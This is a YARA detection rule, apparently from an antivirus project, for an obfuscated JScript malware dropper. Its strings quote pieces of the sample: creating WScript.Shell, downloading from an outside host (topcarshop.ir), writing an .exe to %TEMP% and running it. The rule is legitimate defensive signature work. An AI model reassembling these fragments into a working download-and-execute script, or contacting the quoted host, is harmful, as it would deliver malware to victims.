rule sig_20160330_0e40c72375f4f7070db6b7ae6ca85666 {
  meta:
    description = "datamaliciousorder - file 20160330_0e40c72375f4f7070db6b7ae6ca85666.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "000e9e97bae78240a620511355f530d418b06eb195c5c956a5cb2fc2a531e1df"

  strings:
    $s1  = "function _R(_LQ0, _Q){_H = _H * 1; return _LQ0 - _Q;};" fullword ascii
    $s2  = "var _P = function _MI() {return WScript[_K](\"WScript\"+\".Shell\");}(), _G = 11;" fullword ascii
    $s3  = "if (_P0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "function _VR() {return _P[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"is1A53Ctvs6.ex\" + \"e\";};" fullword ascii
    $s5  = "function _SH(){return _WG + \"\";};" fullword ascii
    $s6  = "_P0[_C](\"GET\", \"http://topcarshop.ir/m1kas\", false);" fullword ascii
    $s7  = "function _I(_Z1){_P[\"Run\"](_Z1, _H, _H);};" fullword ascii
    $s8  = "function _W() {return ((_XU == true) && (_XU == _UA)) ? 1 : _H;};" fullword ascii
    $s9  = "function _L0()" fullword ascii
    $s10 = "function _X(){return 22;};" fullword ascii
    $s11 = " while (_B){" fullword ascii
    $s12 = "return _R(_I0, _W0);" fullword ascii
    $s13 = "function _CB(){return _K;};" fullword ascii
    $s14 = "var _V1 = new this[\"Date\"]();" fullword ascii
    $s15 = "function _L(_QI) {var _D0 = (1, 2, 3, 4, 5, _QI); return _D0;};" fullword ascii
    $s16 = "var _YT = false;" fullword ascii
    $s17 = "var _UA = false;" fullword ascii
    $s18 = "_UA = true; " fullword ascii
    $s19 = "var _XU = false;" fullword ascii
    $s20 = "_XU = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}